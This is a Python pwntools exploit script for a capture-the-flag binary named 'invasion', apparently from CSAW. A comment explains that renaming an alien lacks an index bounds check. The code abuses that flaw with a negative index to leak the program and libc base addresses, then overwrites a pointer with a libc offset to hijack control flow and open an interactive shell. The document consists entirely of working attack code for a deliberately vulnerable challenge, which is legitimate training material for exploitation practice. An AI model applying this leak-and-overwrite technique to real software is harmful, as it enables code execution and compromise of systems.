#!/usr/bin/env python
# coding=utf-8
from pwn import *

'''
When renaming an alien there is no check if the index is inside of the alien array so we have an arbitrary write and just before edditing the alien it prints its name so we can use that to leak an address.
Also there is an off by one when adding an alien which could also be exploited to get code execution (this bug is probably unintended)
'''

#r = remote('pwn.chal.csaw.io', 9004)
r = process('./invasion')

pause()

def create_alien(name, size):
	r.sendafter('Brood mother, what tasks do we have today.\n', '1\n')
	r.sendafter('How long is my name?\n', str(size) + '\n')
	r.sendafter('What is my name?\n', name)

def rename_alien_pt1(index):
	r.sendafter('Brood mother, what tasks do we have today.\n', '3\n')
	print 1
	r.sendafter('Brood mother, which one of my babies would you like to rename?\n', str(index) + '\n')
	print 1
	old_name = r.recvuntil(' to?\n').split(' to?\n')[0].split('rename ')[1]
	print 1
	return old_name

def rename_alien_pt2(name):
	r.send(name + '\n')

r.sendafter('Daimyo, nani o shitaidesu ka?\n', '3\n')
print 1

create_alien('test', 8)
executable_section = u64(rename_alien_pt1(-10)[:6].ljust(8, '\x00')) - 0x202070
log.success('Executable section @ ' + hex(executable_section))
aliens = executable_section + 0x2020c0
rename_alien_pt2(p64(aliens))
rename_alien_pt1(-10)
rename_alien_pt2(p64(executable_section + 0x202058))
libc = u64(rename_alien_pt1(0)[:6].ljust(8, '\x00')) - 0x3b3f0
log.success('Libc @ ' + hex(libc))
rename_alien_pt2(p64(libc + 0x45390))

r.interactive()